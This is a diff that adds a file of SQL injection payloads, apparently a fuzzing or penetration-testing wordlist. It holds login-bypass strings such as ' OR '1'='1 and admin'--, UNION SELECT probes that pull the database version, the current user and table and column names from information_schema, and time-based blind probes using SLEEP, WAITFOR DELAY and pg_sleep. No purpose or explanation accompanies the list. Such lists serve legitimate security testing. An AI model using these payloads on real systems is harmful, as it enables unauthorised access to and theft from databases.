@@ -1,0 +1,34 @@
+'
+"
+`
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+' OR '1'='1' --
+' OR 1=1#
+1' OR '1'='1
+1" OR "1"="1
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT @@version--
+' UNION SELECT user()--
+' UNION SELECT database()--
+' AND 1=2 UNION SELECT table_name FROM information_schema.tables--
+' AND 1=2 UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' AND SLEEP(5)--
+' WAITFOR DELAY '0:0:5'--
+'; SELECT pg_sleep(5)--
+') OR ('1'='1
+' OR 1=1 ORDER BY 1--
+' OR 1=1 ORDER BY 100--
+' HAVING 1=1--
+' GROUP BY columnnames having 1=1--
+admin'--
+admin' #
+admin'/*
+' OR 'x'='x
+') OR ('x'='x
